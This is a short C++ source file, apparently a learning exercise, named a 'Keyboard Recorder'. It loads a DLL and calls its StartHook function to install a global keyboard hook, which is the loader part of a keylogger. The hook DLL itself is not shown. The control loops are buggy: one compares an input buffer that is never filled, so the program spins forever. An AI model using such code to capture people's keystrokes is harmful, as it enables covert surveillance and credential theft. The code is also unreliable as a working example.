// Keyboard Recorder.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<windows.h>
#include<iostream>
using namespace std;





typedef BOOL(*Func)();//函数指针


int main()
{
	/*while (true)
	{
		cout << GetAsyncKeyState(VK_SPACE) << endl; //GetAsyncKeyState函数如键已被按过，则位0设为1；否则设为0。

	}*/
	//如果需要实现全局HOOK，只有动态链接库才能实现


	
	DWORD dwError = NOERROR;
	BOOL bRet = FALSE;
	HINSTANCE hDll = nullptr;
	do
	{
		hDll = LoadLibraryW(L"SetWindowsHookExDLL.dll");//加载动态链接库
		if (!hDll)//如果不对获取错误码
		{
			dwError = GetLastError();
			break;
		}
		Func fun=(Func)GetProcAddress(hDll, "StartHook");//通过API获取函数的位置//同上面的TYPEDEF
		if (!fun)//判断指针不为空
		{
			dwError = GetLastError();
			break;
		}
		if (!fun())//调用FUN
		{
			break;
		}
		while (true)
		{
			char szInput[MAXBYTE] = { 0 };
			if (0 == strcmp(szInput, "yes"))
			{
				break;

			}
		}
		bRet = TRUE;
	} while (true);


	if (FALSE == bRet)
	{
		cout << "出现错误" << dwError << endl;
	}
	
	
	

	if (hDll)
	{
		FreeLibrary(hDll);
	}

	getchar();

    return 0;
}

